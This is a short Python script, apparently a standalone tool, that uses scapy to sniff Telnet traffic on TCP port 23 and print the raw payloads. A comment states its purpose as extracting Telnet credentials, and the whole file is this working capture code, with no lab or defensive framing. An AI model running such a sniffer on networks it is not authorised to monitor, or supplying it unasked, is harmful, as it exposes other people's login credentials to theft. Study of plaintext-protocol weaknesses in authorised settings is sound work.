#!/usr/bin/env python3
from scapy.all import sniff, TCP, Raw
# Function to extract telnet credentials
def got_telnet_packet(pkt):
   if pkt.haslayer(TCP) and pkt.haslayer(Raw):
       try:
           print(f"[+] Captured Telnet Data: {pkt[Raw].load.decode(errors='ignore')}")
       except:
           pass
# Sniff TCP packets on port 23 (Telnet)
print("[*] Sniffing Telnet traffic on port 23...")
sniff(filter="tcp port 23", prn=got_telnet_packet, store=False)